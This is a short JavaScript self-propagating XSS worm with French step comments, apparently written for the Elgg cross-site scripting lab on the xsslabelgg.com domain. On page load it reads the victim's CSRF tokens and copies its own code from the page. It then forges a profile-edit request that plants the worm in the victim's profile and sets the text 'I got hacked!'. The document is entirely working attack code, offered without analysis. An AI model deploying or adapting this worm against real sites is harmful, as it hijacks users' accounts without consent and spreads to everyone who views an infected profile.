<script id="worm" type="text/javascript"> 
window.onload = function(){ 

   // Étape 1 : Récupérer le token CSRF 
  var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts; 
  var token = "&__elgg_token=" + elgg.security.token.__elgg_token; 
  
  // Étape 2 : Copier le code du worm depuis le DOM 
  var headerTag = "<script id=\"worm\" type=\"text/javascript\">"; 
  var jsCode = document.getElementById("worm").innerHTML; 
  var tailTag = "</" + "script>";
  var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); 

  // Étape 3 : Récupérer le nom de la victime 
  var userName = elgg.session.user.name; 
  var guid = elgg.session.user.guid;
  // Étape 4 : Forger la requête POST pour modifier le profil
  var content = "name=" + userName + 
                        "&description=" + wormCode +
                        "&accesslevel[description]=2" + 
                        "&briefdescription=I got hacked!" + 
                        "&accesslevel[briefdescription]=2" + 
                        "&guid=" + guid +
                        ts + token; 

  var sendurl = "http://www.xsslabelgg.com/action/profile/edit"; 

  var Ajax = new XMLHttpRequest(); 
  Ajax.open("POST", sendurl, true); 
  Ajax.setRequestHeader("Content-Type", 
          "application/x-www-form-urlencoded"); 
  Ajax.send(content); } </script>
